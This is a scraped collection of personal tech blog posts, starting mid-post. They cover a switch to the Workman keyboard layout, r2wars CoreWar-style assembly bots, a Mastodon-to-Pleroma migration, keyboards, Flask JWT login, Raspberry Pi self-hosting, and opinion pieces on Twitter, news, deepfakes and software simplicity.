I also made a tiny change\nto the layout — swapping the F and B keys, since\ntyping the “fo” / “of” digram in the same hand felt really weird. Soon\nenough, I was averaging about 30 – 40 WPM within the first week of\nhaving switched to Workman.\n\nAnd then things at work started to pick up, and I had to do what I had\nbeen dreading the most: edit code — in Vim. It’s fairly common\nknowledge that Vim, by default, extensively uses the H,\nJ, K and L keys for navigation. Sure,\nthere are better ways to move around and only using those keys is\nfrowned upon — but it’s a habit built over years, and hard to shake\noff. After poking around for a bit, I found the\nvim-workman plugin. Forked it\nto apply the F/B change, and I began using it.\n\nIt was great at first. My Vim muscle memory was not hampered, as I was\nable to use QWERTY in normal mode, and Workman in insert. But as I got\nbetter at Workman, I found myself instinctively reaching for the Workman\nkeys in normal mode. Well, everything except for the H,\nJ, K and L keys. This quickly became\nbothersome and I uninstalled the plugin to search for a better solution.\n\nWait, don’t I have a sick new programmable mechanical\nkeyboard? What if I configure a layer on it just for the\nH, J, K, L keys? After pouring\nthrough the manual for a bit, I eventually got it set up. I even remapped\nthe Caps Lock key to Fn so it’s easier to access the\nlayer. So now, hitting Caps\nLock+Y/N/E/O results in\nHJKL being pressed. This took a little bit of getting used to,\nbut it got easier with a bit of practice.\n\nSince I don’t rely on any plugin/remappings, I can use Vim as is on\nremote machines too. Another bonus from this adventure was I actually\nspent time learning better ways to navigate, and reduce my reliance on\nHJKL. Overall, a big win.\n\nIt’s been over 4 weeks since my switch, I think, and I’m comfortably\naveraging around 80 WPM. Still a good 20 WPM slower than QWERTY, but\nI think it’ll get better with time. And am I still able to use QWERTY?\nWell, kinda. I still use QWERTY on my phone keyboard, since Workman\nisn’t an option on it and it’s actually alright. However, when I use my\ndesktop to play Dota, I prefer using voice chat to communicate since\ntyping on QWERTY takes too long — I am forced to hunt and peck.\nInterestingly, after about 15 – 20 minutes on QWERTY, my brain kinda\njust clicks back and I can type on it with relative ease. Not as fast as\nI used to be, but it’s manageable.\n\nAll things considered, switching to Workman was one of the better\ndecisions I have made in life. It feels so nice to be able to type out\nwhole words in just the home row. It just flows so nicely, and it has\nmade typing so much more enjoyable again.\n'] at ['https://icyphox.sh/blog/workman']

Found SUMMARY ['r2wars is\na CoreWar-like game thar runs within the radare2\nESIL\nvirtual machine. In short, you have two programs running in a shared\nmemory space (1kb), with the goal of killing the other and surviving as\nlong as possible. r2wars was conducted as a part of\nr2con2020.\n\nday 1\n\nMy first submission was an incredibly simple “bomber”. All it does is\nwrite code to a location, jump there, and continue executing the same\nthing over and over.\nmov eax, 0xfeebfeeb; just some bad jumps\nmov ebx, eax\nmov ecx, eax\nmov edx, eax\nmov ebp, eax\nmov edi, eax\nmov esp, 0x3fc\nmov esi, 0x3fd\nmov [esi], 0xe6ff60\njmp esi\n\nSpecifically, it writes 0xe6ff60, which is\npushal\njmp esi\n\neffectively looping over and over. pushal is a very interesting x86\ninstruction, that pushes all the registers and decrements the stack\npointer esp by how many ever bytes were pushed. Nifty, especially if\nyou’re looking for high throughput (to bomb the address space). Here, it\nstarts bombing from 0x3fc – 0x000 (and below, because there’s no\nbounds checking in place), and ends up killing itself, since writing\noutside of the arena (0x000 – 0x400) is illegal.\n\nUltimately, this bot placed 7th out of 9 contestants — an underwhelming\noutcome. I had to fix this.\n\n\n\nday 2\n\nI sat for a second and recollected the different reasons for my bot\ngetting killed, and the one that occurred the most was my bot\ninsta-dying to bad instructions being written from 0x400 — i.e. from\nnear where I’m positioned. Nearly all competing bots write from bottom\nup, because pushal decrements the stack pointer. So the obvious\nsolution was to reposition my initial payload way above, at 0x000. And\nof course, it goes without saying that this assumes everyone’s using\npushal (they are).\nmov eax, 0xffffffff\nmov ecx, eax\nmov edx, eax\nmov ebx, eax\nmov ebp, eax\nmov esi, eax\n\ncheck:\n    mov edi, 0x000\n    cmp [edi], 0\n    jne planb\n    mov esp, 0x400\n    inc edi\n    mov [edi], 0xe7ff6060; pushal, jmp edi\n    jmp edi\n\nplanb:\n    mov edi, 0x3fb\n    mov [edi], 0xe7ff6060\n    mov esp, 0x3fa\n    jmp edi\n\nI also added a (pretty redundant) check to see if the stuff at edi was\n0, since the entire arena is initially 0x0. My reasoning, albeit\nflawed, was that if it wasn’t 0, then it was unsafe to go there. In\nhindsight, it would’ve been safer, since it’s already been written\nover by somebody. In any case, planb never got executed because of\nwhat I’d mentioned earlier — everyone writes from 0x400. Or\nanywhere above 0x000, for that matter. So I’m relatively safer than\nI was in day 1.\n\nThese changes paid off, though. I placed 4th on day 2, out of 13\ncontestants! This screenshot was taken on my phone as I was eating\ndinner.\n\n\n\nAll wasn’t well though — I still lost 4 matches, for the reasons below:\n\n\nI’d get snuffed out before my bomb wave from 0x400 would reach\nthe opponent.\nI’d end up bombing myself without hitting anyone on the way up.\n\n\nday 3\n\nI needed to add some checks to prevent killing myself in the process of\nbombing.\nmov eax, 0xffffffff\nmov ecx, eax\nmov edx, eax\nmov ebx, eax\nmov ebp, eax\nmov esi, eax\n\nmov edi, 0x000\nmov esp, 0x400\nmov [edi], 0x20fc8360\nmov [edi+4], 0xff600374\nmov [edi+8], 0x0400bce7\nmov [edi+12], 0xe7ff0000\njmp edi\n\nIf you noticed, the initial payload I’m writing to the address at edi\nis a bit more complex this time — let’s break it down.\n0x20fc8360\n0xff600374\n0x0400bce7\n0xe7ff0000\n\nThis translates to:\n60                pushal \n83 FC 20          cmp    esp, 0x20\n74 03             je     9\n60                pushal \nFF E7             jmp    edi\nBC 04 00 00 00    mov    esp, 0x400; <- 0x9\nFF E7             jmp    edi\n\nI check if the stack pointer is 0x20 (decrements from 0x400 due to\npushal); if yes, reset to 0x400, else continue looping. This\nprevented me from writing myself over, and also resets bombing from\n0x400 — better chance of hitting someone we missed in our first wave.\n\nSounds good? That’s what I thought too. Day 3 had a bunch of new bot\nsubmissions (and some updated submissions), and a lot of them checked\n0x000 for existence of a bot, effectively recking me. I placed 8th out\nof 14 contestants, with 7 wins and 6 losses. Tough day.\n\n\n\nday 4: the finals\n\nI spent a lot of time refactoring my bot. I tried all kinds of things,\neven reworked it to be entirely mobile using the pushal + jmp esp\ntrick, but I just wasn’t satisfied. In the end, I decided to address the\nproblem in the simplest way possible. You’re checking 0x000? Okay,\nI’ll reposition my initial payload to 0xd.\n\nAnd this surprisingly tiny change landed me in 4th place out of 15\ncontestants, which was way better than I’d anticipated! The top spots\nwere all claimed by ARM, and naturally so — they had a potential\nthroughput of 64 bytes per cycle thanks to stmia, compared to x86’s 32\nbytes.

Found SUMMARY ['If you’ve been following me on the fediverse, you would’ve witnessed my\nnumerous (failed) attempts at migrating from Mastodon to Pleroma,\nrunning on my Raspberry Pi. I finally got it working, and these are the\nsteps I took. It’s sort of a loose guide you could follow, but I can’t\npromise it’ll work for you.\n\nThe Erlang and Elixir packages are pretty broken and outdated on\nRaspbian. So this time, I built them from source.12 I also assume\nyou have Mastodon and Pleroma (source, not OTP) installed — probably at\n/home/mastodon/live and /opt/pleroma, respectively.\n\nOnce you have Erlang and Elixir compiled and sitting in your PATH,\npull soapbox-pub/migrator.\nNow read the readme and the do_migration.sh script to get an idea of\nwhat you’re getting into.\n\nMove into the cloned directory and create a .env:\nMASTODON_PATH=/home/mastodon/live\nPLEROMA_PATH=/opt/pleroma\n\nThen, run:\n$ yarn   # install deps\n$ cp -r mastodon/* /home/mastodon/live\n$ cp -r pleroma/* /opt/pleroma\n$ RAILS_ENV=production yarn masto export\n\nIf you run into any permissions issues, chown and proceed. This should\nexport all your Mastodon activity into /home/mastodon/live/migrator.\nNow, copy the migrator directory into your Pleroma installation path.\n$ cp -r migrator /opt/pleroma\n\nYou can then import all of it into Pleroma (possibly prefixed with sudo\n-Hu pleroma):\n$ MIX_ENV=prod mix migrator.import\n\nIf all went well, you would’ve successfully migrated from Mastodon to\nPleroma. If not, well feel free to send me an email (or @ me on the fedi).\nI suppose you could also reach Alex — he’s\nthe incredibly based guy who wrote the migrator,\nsoapbox-fe and does some Elixir magic he keeps\nposting about.\n\nRest assured, the migrator has a 100% success rate — Alex and I are\napparently the only two who have it working. 2⁄2.\n\nwhy should you migrate?\n\nBecause Pleroma is cleaner, leaner3 and prettier looking4. Oh, and we\nhave chats.\n\n\n\n\n\n\n\nErlang install guide\n\nElixir install guide\n\nMastodon used about ~2.5 GB out of the 4 I have on my Pi. With\n  Pleroma, the total used RAM is only about ~700 MB. That’s crazy!\n\n…with Soapbox. :^)\n\n\n\n'] at ['https://icyphox.sh/blog/mastodon-to-pleroma']

Found SUMMARY ['Thanks to the pandemic yada yada I’ve been working from home (and\nattending college from home), and I figured my WFH setup could use an\nupgrade. Unfortunately, the choices for mechanical keyboards in India are\nfairly limited. All imports from China don’t get through, and imports\nfrom elsewhere have a fat duty slapped on it — sometimes up to\n300%1. It’s obscene!\n\nThe only reliable source I’ve found (and folks on\nr/mkindia will concur), is\nMeckeys. They aren’t particularly abundant in\nvariety, but there’s some decent prebuilts that you can pick up on\nthere — and I copped the Ducky One 2 SF.\n\n\n\nIt’s a 65% board, so unlike standard 60% boards, this comes with arrow\nkeys and the Del, PgUp and PgDn keys. I don’t really need the\narrow keys, but they do come handy on the occasion — like scrolling,\nfor example. Since this board lacks the function row, the Esc and the\n~ keys are merged. I have to hit Shift + Esc for tilde (same action\nas usual), and Fn + Esc for the backtick. Takes a bit of relearning,\nbut it’s manageable.\n\n\n\nThe key switches I went with were the Cherry MX Speed Silvers — like\nReds but actuate a bit faster. As it’s my first ever mechanical\nkeyboard, I don’t really have anything to compare it against. It feels\ngreat, but it was pretty jarring initially because even the slightest\ntouch (with the palm for instance), would cause a key to actuate, leading\nto typos. Again, just a matter of getting accustomed to it; all smooth\nsailing after. Why did I pick the Speed Silvers? The other switch\noptions were out of stock.\n\nThat said, I think I really quite like linear switches. They’re not\ntoo noisy, and they feel just right. I haven’t noticed any great\nimprovement in my typing speeds though — I still maintain an average of\n90-100 WPM.\n\nThe One 2 SF is fully RGB, i.e. each key is individually lit. Not that\nI make big use it. I have it set to plain white, and only light up under\nthe key I’m currently pressing. Yes, this also makes it incredibly easy\nfor people to shoulder-peek your passwords. I certainly won’t be using\nit outside home.\n\nThe keyboard itself cost 9599 INR, which is about 128 USD. Meckeys\ntook exactly 10 days to ship it (3rd Aug – 13th Aug). Overall, it’s\na lovely keyboard, and I cannot type on my laptop’s low-travel\nchiclet-style keyboard, again. There’s just no going back.\n\n\n\n\n\n\nReddit link\n\n\n\n'] at ['https://icyphox.sh/blog/ducky-one-2']

Found SUMMARY ['This post has been a long time coming. Earlier this year, I decided to\nnot actively participate on Twitter, and stick to the fediverse\nprimarily. This has been quite possibly the best decision I’ve made,\nwith regard to curating my social / informational feeds — apart from\nnot reading news. I’ll try to gloss over some reasons\nas to why I dislike Twitter as a platform, in this post. Bear in mind,\nthese are based on my experiences and YMMV.\n\nfilter bubbles and radicalization\n\nI think this can be said about any social network, but the way that\nTwitter is designed only further enables this phenomenon. The more you\ninteract / show interest in a specific topic, the more you see of the\nsame — in terms of suggested accounts to follow, notifications/email telling\nyou XYZ tweeted this (you probably don’t even follow XYZ).\n\nI’ve experienced this first hand. I created an alt and followed a few\nprominent right-wing accounts (for science!), and within a day or two,\nmy notifications and inbox were filled with similar accounts & tweets.\n\nThis, as a result, means the user is much more likely to see content\nsimilar to their own perspectives — a filter bubble. The user is\neffectively isolated in their own ideological bubbles. Consequentially,\nany form of disagreement that occurs is tossed aside as the other\nparty’s flaw.\nSurely they wouldn’t hold that perspective if they could see things\nyour way! It’s their ignorance!\n\nOne might argue, however, that they do in fact see a lot of opposing\nviewpoints in their feed. After all, most of mainstream discourse on\nTwitter is just derisive tweets by proponents of either side1, at\neach other. The left quote-tweeting the right and vice versa, for\nexample. In fact, this is pretty much all that today’s “news” is\nabout — constant, endless rebuttals to the other’s perspective.\nI still think this is filter bubbling — the constant\nreaffirmation of your ideologies, by taking potshots at the other side.\n\nAnd what does constant exposure to a singular viewpoint lead to? That’s\nright, radicalization. I won’t get into too much detail — there really\nisn’t much to say. I’ll just add that I know of a few cases IRL, where\nwithin little over a year of having created a Twitter account the\nperson’s political and ideological positions became hard lines — and\nthey now straight up refuse to look at things any other way. This is by\nno means a scientific conclusion; there are various other influencing\nfactors, but my point still stands.\n\nfavors mistakes over apologies\n\nTwitter’s design is plagued with flaws, but this one takes the cake. If\nyou screw up or tweet something incorrect, and it happens to go viral,\nthere’s literally no good way to publish a correction / apology. Quoting\nthe fantastic article by Nick Punt on deescalating conflict on social\nmedia:\n\n\nIf we ignore replies, the simple amplification effects of likes,\nreplies, retweets, and subtweets leave us exposed and the situation\ncan get out of hand. If we delete and post another, people are\nunlikely to see our follow-up, as corrections are rarely viral.\nSimilarly, even if we reply, only our viral mistake will be seen in\nthe feed of others.\n\n\ntoo much USPOL\n\nThis might be a non-issue for US residents, but gosh is it irritating to\nsee US politics literally everywhere. I’m of the opinion that USPOL is\ngiven an unfair amount of attention in mainstream discourse — to the\npoint where it overshadows everything else, and Twitter is no exception.\n\ngenerally unhealthy discourse\n\nIf you take a close look at the overarching theme of most Tweets, or\neven just the popular ones — you’ll notice a fairly negativist outlook\nacross most, if not all of them. The\nr/2meirl4meirl kind.2 This is\na very unhealthy environment to socialize in. Constantly brooding over\nthings you can’t really affect is quite pointless.\n\nAnother general theme is the constant need for one-upping the other — the\nnever-ending contest of who’s going to post the most clever\ncomeback. For what? For the likes and retweets, of course. This is also\nwhat most of “cancel culture” is really about — pick a target, post\nscreenshots, add a snide remark: voilà, you have a somewhat popular\ntweet.\n\nwhy don’t you just curate your feed then bro?\n\nYeah, no. I’ve tried. The problem is, following someone for the\ntechnical content doesn’t imply they’re constantly only going to post\nthat — and that’s their prerogative. And Twitter’s annoying “XYZ liked\nthis tweet” doesn’t help either. Trying to make your Twitter timeline\nBS-free is like trying to straighten a dog’s tail.\n\nSo what do I suggest then? I really don’t know. Honestly, all social\nmedia sucks. The entire idea is so contrived and the world would’ve been\nbetter off without it — the incessant, mind-numbing feed of\ninformation. But the shinier turd here is the fediverse. It’s not\ngoverned by $BIGTECH, and extremists have decided to stick to their\nown echo chambers like Gab. Oh, and the other side propagates massive\nblocklists for the tiniest of infractions (defined by them), so they\neffectively echo chambered themselves too. I’m not complaining.\n\n\n“All social media sucks, but the fediverse sucks less.”\n— Me, 2020\n\n\n\n\n\n\n\nBy which I mean any two ideologically opposing groups.\nNot restricted to politics.\n\nMost posts on that sub are just screenshots of tweets, so…\n\n\n\n'] at ['https://icyphox.sh/blog/twitter']

Found SUMMARY ['For the past few months, I’ve been working on building a backend for\n$STARTUP, with a bunch of friends. I’ll probably write in detail about\nit when we launch our beta. The backend is your bog standard REST API,\nbuilt on Flask — if you didn’t guess from the title already.\n\nOur existing codebase heavily relies on\nFlask-Login; it offers some pretty\nneat interfaces for dealing with users and their states. However, its\ndefault mode of operation — sessions — don’t really fit into a Flask\napp that’s really just an API. It’s not optimal. Besides, this is what\nJWTs were built for.\n\nI won’t bother delving deep into JSON web tokens, but the general\nflow is like so:\n\n\nclient logs in via say /login\na unique token is sent in the response\neach subsequent request authenticated request is sent with the token\n\n\nThe neat thing about tokens is you can store stuff in them — “claims”,\nas they’re called.\n\nreturning an access_token to the client\n\nThe access_token is sent to the client upon login. The idea is simple,\nperform your usual checks (username / password etc.) and login the user\nvia flask_login.login_user. Generate an access token using\nflask_jwt_extended.create_access_token, store your user identity in it\n(and other claims) and return it to the user in your 200 response.\n\nHere’s the excerpt from our codebase.\naccess_token = create_access_token(identity=email)\nlogin_user(user, remember=request.json["remember"])\nreturn good("Logged in successfully!", access_token=access_token)\n\nBut, for login_user to work, we need to setup a custom user loader to\npull out the identity from the request and return the user object.\n\ndefining a custom user loader in Flask-Login\n\nBy default, Flask-Login handles user loading via the user_loader\ndecorator, which should return a user object. However, since we want to\npull a user object from the incoming request (the token contains it),\nwe’ll have to write a custom user loader via the request_loader\ndecorator.\n# Checks the 'Authorization' header by default.\napp.config["JWT_TOKEN_LOCATION"] = ["json"]\n\n# Defaults to 'identity', but the spec prefers 'sub'.\napp.config["JWT_IDENTITY_CLAIM"] = "sub"\n\n@login.request_loader\ndef load_person_from_request(request):\n    try:\n        token = request.json["access_token"]\n    except Exception:\n        return None\n    data = decode_token(token)\n    # this can be your 'User' class\n    person = PersonSignup.query.filter_by(email=data["sub"]).first()\n    if person:\n        return person\n    return None\n\nThere’s just one mildly annoying thing to deal with, though.\nFlask-Login insists on setting a session cookie. We will have to disable\nthis behaviour ourselves. And the best part? There’s no documentation\nfor this — well there is, but it’s incomplete and points to deprecated\nfunctions.\n\ndisabling Flask-Login’s session cookie\n\nTo do this, we define a custom session interface, like so:\nfrom flask.sessions import SecureCookieSessionInterface\nfrom flask import g\nfrom flask_login import user_loaded_from_request\n\n@user_loaded_from_request.connect\ndef user_loaded_from_request(app, user=None):\n    g.login_via_request = True\n\n\nclass CustomSessionInterface(SecureCookieSessionInterface):\n    def should_set_cookie(self, *args, **kwargs):\n        return False\n\n    def save_session(self, *args, **kwargs):\n        if g.get("login_via_request"):\n            return\n        return super(CustomSessionInterface, self).save_session(*args, **kwargs)\n\n\napp.session_interface = CustomSessionInterface()\n\nIn essence, this checks the global store g for login_via_request and\nand doesn’t set a cookie in that case. I’ve submitted a PR upstream for\nthis to be included in the docs\n(#514).\n'] at ['https://icyphox.sh/blog/flask-jwt-login']

Found SUMMARY ['News — the never ending feed of information pertaining to “current\nevents”, politics, trivia, and other equally useless junk. News today is\nliterally just this: “&lt;big name person&gt; did/said &lt;dumb thing&gt;!”,\n“&lt;group&gt; protests against &lt;bad thing&gt;!”, and so on. Okay, shit’s going\non in this world. Another day, another thing to be $FEELING about.\n\nNow here’s a question for you: do you remember what news you consumed\nyesterday? The day before? Last week? Heck no! Maybe some major\nheadlines, but really, what did you gain from learning that information?\nMust’ve been interesting to read at that time. Hence, news, by\nvirtue of its “newness”, is given importance — and get this, it isn’t\neven important enough for you to bother remembering it for a few days.\n\nNews is entertainment. Quick gratification that lasts a day, at max.\n\nactionable news\n\nSo what is useful news, then? I think I’ll go out on a limb here, and\nsay “anything that is actionable”. By that I mean anything that you can\nphysically affect / information that you can actually put to use. Again,\nthere are probably edge-cases and this isn’t a rule that fits all, but\nit’s a decent principle to follow.\n\nAs an example, to readers living outside of the US, news regarding\npolice brutality & the Black Lives Matter movement are unactionable.\nI’m not saying those problems don’t exist or don’t matter, but what\nare you really doing to help the cause? Sending thoughts and prayers?\nPosting angrily on Instagram? Tweeting about it? Stop, and think for\nyourself if these things actually make any difference. Your time might\nbe better invested in doing something else.\n\nother problems\n\nThere are other, more concerning problems with modern news — it is no\nlonger purely objective. The sad state of news / reporting today is it’s\ninherently biased. I mean political bias, of course. All news is either\nleft-leaning or right-leaning, and narratives are developed to fit their\npolitical stance. This is essentially propaganda. Today’s news is\npropaganda. If anything, this should be reason enough to avoid it.\n\nbut I compare multiple sources!\n\nOkay, so you read the same thing written by CNN, BBC, The New York\nTimes, etc.? Do you realize how much time you wasted doing this?\nUltimately to what end — to forget about it by the next day, and do it\nall over again. What a dull, braindead process.\n\nwon’t I be ignorant then?\n\nIf you think keeping up with current events makes you intellectually\nsuperior somehow…boy are you wrong. Do something that actually\nstimulates your gray matter. But, here’s the thing, if the “news” is big\nenough, you’re bound to come across it anyway! You might hear your\nfriend discuss it, or see it on Twitter, so on and so forth. How you\nprocess it thereafter is what matters.\n\nGive it a thought. Imagine if all that social media, news, and general\ninternet noise didn’t clog your head. I think it’ll be much nicer. You\nmight not, and that’s okay.

Found SUMMARY ['I’d ordered the Raspberry Pi 4B (the 4GB variant), sometime early\nthis year, thinking I’d get to self-hosting everything on it as soon as\nit arrived. As things turn out, it ended up sitting in its box up until\ntwo weeks ago — it took me that long to order an SD card for it. No,\nI didn’t have one. Anyway, from there began quite the wild ride.\n\nflashing the SD card\n\nYou’d think this would be easy right? Just plug it into your laptop’s SD\ncard reader (or microSD), and flash it like you would a USB drive. Well,\nnope. Of the three laptops at home one doesn’t have an SD card reader,\nmine — running OpenBSD — didn’t detect it, and my brother’s — running\nVoid — didn’t detect it either.\n\nThen it hit me: my phone (my brother’s, actually), has an SD card slot\nthat actually works. Perhaps I can use the phone to flash the image?\nTook a bit of DDG’ing (ducking?), but we eventually figured out that the\nblock-device for the SD on the phone was /dev/mmcblk1. Writing to it\nwas just the usual dd invocation.\n\ngot NAT’d\n\nAfter the initial setup, I was eager to move my services off the Digital\nOcean VPS, to the RPi. I set up the SSH port forward through my router\nconfig, as a test. Turns out my ISP has me NAT’d. The entirety of my\napartment is serviced by these fellas, and they have us all under\na CG-NAT. Fantastic.\n\nEvading this means I either lease a public IP from the ISP, or\nI continue using my VPS, and port forward traffic from it via a tunnel.\nI went with option two since it gives me something to do.\n\nNAT evasion\n\nThis was fairly simple to setup with Wireguard and iptables. I don’t\nreally want to get into detail here, since it’s been documented aplenty\nonline, but in essence you put your VPS and the Pi on the same network,\nand forward traffic hitting your internet facing interface (eth0)\nto the VPN’s (wg0). Fairly simple stuff.\n\nsetting up Mastodon on the Pi\n\nMastodon was kind of annoying to get working. My initial plan was to\nport forward only a few selected ports, have Mastodon exposed on the Pi\nat some port via nginx, and then front that nginx via the VPS. So\nbasically: Mastodon (localhost on Pi) <–> nginx (on Pi) <–> nginx (on\nVPS, via Wireguard). I hope that made sense.\n\nAnyway, this setup would require having Mastodon run on HTTP, since I’ll\nbe HTTPS’ing at the VPS. If you think about it, it’s kinda like what\nCloudflare does. But, Mastodon doesn’t like running on HTTP. It just\nwasn’t working. So I went all in and decided to forward all 80⁄443\ntraffic and serve everything off the Pi.\n\nGetting back to Mastodon — the initial few hiccups aside, I was able to\nget it running at toot.icyphox.sh. However, as a seeker of aesthetics,\nI wanted my handle to be @icyphox.sh. Turns out, this can be achieved\nfairly easily.\n\nAdd a new WEB_DOMAIN variable to your .env.production file, found in\nyour Mastodon root dir. Set WEB_DOMAIN to your desired domain, and\nLOCAL_DOMAIN to the, well, undesired one. In my case:\nWEB_DOMAIN=icyphox.sh\nLOCAL_DOMAIN=toot.icyphox.sh\n\nFunnily enough, the\nofficial documentation for this\nsays the exact opposite, which…doesn’t work.\n\nI don’t really understand, but whatever it works and now my Mastodon is\n@x@icyphox.sh. I’m not complaining. Send\nmail if you know what’s going on here.\n\nAnd oh, here’s the protective case nerd fashioned\nout of cardboard.\n\n\n'] at ['https://icyphox.sh/blog/pi']

Found SUMMARY ['The past couple of days, I’ve spent a fair amount of time tweaking this\nsite. My site’s build process involves\nvite and a bunch of\nscripts. These\nscripts are executed via vite’s pre- and post-build actions. The big\nchanges that were made were performance improvements in the\nupdate_index.py script, and the addition of openring.py, which you\ncan see at the very bottom of this post!\n\nspeeding up index page generation\n\nThe old script — the one that featured in Hacky\nscripts — was absolutely ridiculous, and not to\nmention super slow. Here’s what it did:\n\n\ngot the most recent file (latest post) by sorting all posts by\nmtime.\nparsed the markdown frontmatter and created a markdown table entry\nlike:\n\nline = f"| [{meta['title']}]({url}) | `{meta['date']}` |"\n\n\nupdated the markdown table (in _index.md) by in-place editing the\nmarkdown, with the line created earlier — for the latest post.\nfinally, I’d have to rebuild the entire site since this markdown\nhackery would happen at the very end of the build, i.e, didn’t\nactually get rendered itself.\n\n\nThat…probably didn’t make much sense to you, did it? Don’t bother.\nI don’t know what I was thinking when I wrote that mess. So with how it\nwas done aside, here’s how it’s done now:\n\n\nthe metadata for all posts are nicely fetched and sorted using\npython-frontmatter.\nthe metadata list is fed into Jinja for use in templating, and is\nrendered very nicely using a simple for expression:\n\n{% for p in posts %}\n<tr>\n<td align="left"><a href="/blog/{{ p.url }}">{{ p.title }}</a></td>\n<td align="right">{{ p.date }}</td>\n</tr>\n{% endfor %}\n\n\n\nA neat thing I learnt while working with Jinja, is you can use\nDebugUndefined in your jinja2.Environment definition to ignore\nuninitialized template variables. Jinja’s default behaviour is to remove\nall uninitialized variables from the template output. So for instance,\nif you had:\n<body>\n    {{ body }}\n</body>\n\n<footer>\n    {{ footer }}\n</footer>\n\nAnd only {{ body }} was initialized in your template.render(body=body),\nthe output you get would be:\n<body>\n    Hey there!\n</body>\n<footer>\n\n</footer>\n\nThis is annoying if you’re attempting to generate your template across\nmultiple stages, as I was. Now, I initialize my Jinja environment like\nso:\nfrom jinja2 import DebugUndefined\n\nenv = jinja2.Environment(loader=template_loader,undefined=DebugUndefined)\n\nI use the same trick for openring.py too. Speaking of…let’s talk\nabout openring.py!\n\nthe new webring thing at the bottom\n\nAfter having seen Drew’s openring,\nmy NIH kicked in and I wrote\nopenring.py. It pretty much\ndoes the exact same thing, except it’s a little more composable with\nvite. Currently, it reads a random sample of 3 feeds from a list of\nfeeds provided in a feeds.txt file, and updates the webring with those\nposts. Like a feed-bingo of sorts. ;)\n\nI really like how it turned out — especially the fact that I got my CSS\ngrid correct in the first try!\n'] at ['https://icyphox.sh/blog/site-changes']

Found SUMMARY ['A few days back, NPR put out an article discussing why deepfakes aren’t\nall that powerful in spreading disinformation.\nLink to article.\n\nAccording to the article:\n\n\n“We’ve already passed the stage at which they would have been most\neffective,” said Keir Giles, a Russia specialist with the Conflict\nStudies Research Centre in the United Kingdom. “They’re the dog that\nnever barked.”\n\n\nI agree. This might be the case when it comes to Russian influence.\nThere are simpler, more cost-effective ways to conduct active\nmeasures, like memes.\nBesides, America already has the infrastructure in place to combat\ninfluence ops, and have been doing so for a while now.\n\nHowever, there are certain demographics whose governments may not have\nthe capability to identify and perform damage control when\na disinformation campaign hits, let alone deepfakes. An example of this\ndemographic: India.\n\nthe Indian landscape\n\nThe disinformation problem in India is way more sophisticated, and\nharder to combat than in the West. There are a couple of reasons for\nthis:\n\n\nThe infrastructure for fake news already exists: WhatsApp\nFact checking media in 22 different languages is non-trivial\n\n\nIndia has had a long-standing problem with misinformation. The 2019\nelections, the recent CAA controversy and even more recently — the\ncoronavirus. In some cases, it has even lead to\nmob violence.\n\nAll of this shows that the populace is easily influenced, and deepfakes\nare only going to simplify this. What’s worse is explaining to a rural\ncrowd that something like a deepfake can exist — comprehension and\nadoption of technology has always been slow in India, and can be\nattributed to socio-economic factors.\n\nThere also exists a majority of the population that’s already been\ninfluenced to a certain degree: the right wing. A deepfake of a Muslim\nleader trashing Hinduism will be eaten up instantly. They are inclined\nto believe it is true, by virtue of prior influence and given the\npresent circumstances.\n\ncountering deepfakes\n\nThe thing about deepfakes is the tech to spot them already exists. In\nfact, some can even be eyeballed. Deepfake imagery tends to have weird\nartifacting, which can be noticed upon closer inspection. Deepfake\nvideos, of people specifically, blink / move weirdly. The problem at\nhand, however, is the general public cannot be expected to notice these\nat a quick glance, and the task of proving a fake is left to researchers\nand fact checkers.\n\nFurther, India does not have the infrastructure to combat deepfakes at\nscale. By the time a research group / think tank catches wind of it, the\ndamage is likely already done. Besides, disseminating contradictory\ninformation, i.e. “this video is fake”, is also a task of its own.\nPublic opinion has already been swayed, and the brain dislikes\ncontradictions.\n\nwhy haven’t we seen it yet?\n\nCreating a deepfake isn’t trivial. Rather, creating a convincing one\nisn’t. I would also assume that most political propaganda outlets are\njust large social media operations. They lack the technical prowess and\n/ or the funding to produce a deepfake. This doesn’t mean they can’t\never.\n\nIt goes without saying, but this post isn’t specific to India. I’d say\nother countries with a similar socio-economic status are in a similar\npredicament. Don’t write off deepfakes as a non-issue just because\nAmerica did.\n'] at ['https://icyphox.sh/blog/efficacy-deepfakes']

Found SUMMARY ['Although it is a very comfy one, it’s not just an aesthetic. Simplicity\nand minimalism, in technology, is great for security too. I say “mostly”\nin the title because human error cannot be discounted, and nothing is\nperfect. However, the simpler your tech stack is, it is inherentely more\nsecure than complex monstrosities.\n\nLet’s look at systemd, for example. It’s got over 1.2 million\nlines of code. “Hurr durr but LoC doesn’t mean anything!” Sure ok, but\ncan you imagine auditing this? How many times has it even been\naudited? I couldn’t find any audit reports. No, the developers are not\nsecurity engineers and a trustworthy audit must be done by\na third-party. What’s scarier, is this thing runs on a huge percentage\nof the world’s critical infrastructure and contains privileged core\nsubsystems.\n\n“B-but Linux is much bigger!” Indeed, it is, but it has a thousand times\n(if not more) the number of eyes looking at the code, and there have been\nmultiple third-party audits. There are hundreds of independent orgs and\nmultiple security teams looking at it. That’s not the case with\nsystemd — it’s probably just RedHat.\n\nCompare this to a bunch of shell scripts. Agreed, writing safe shell can\nbe hard and there are a ton of weird edge-cases depending on your shell\nimplementation, but the distinction here is you wrote it. Which means,\nyou can identify what went wrong — things are predictable.\nsystemd, however, is a large blackbox, and its state at runtime is largely\nunprovable and unpredictable. I am certain even the developers don’t\nknow.\n\nAnd this is why I whine about complexity so much. A complex,\nunpredictable system is nothing more than a large attack surface. Drew\nDeVault, head of sourcehut wrote something\nsimilar (yes that’s the link, yes it has a typo).:\n\nhttps://sourcehut.org/blog/2020-04-20-prioritizing-simplitity/\n\nHe manually provisions all\nsourcehut infrastructure, because tools like Salt, Kubernetes etc. are\njust like systemd in our example — large monstrosities which can get you\nRCE’d. Don’t believe me? See\nthis.\n\nThis was day 3 of the #100DaysToOffload challenge. It came out like\na systemd-hate post, but really, I couldn’t think of a better example.\n'] at ['https://icyphox.sh/blog/simplicity-security']

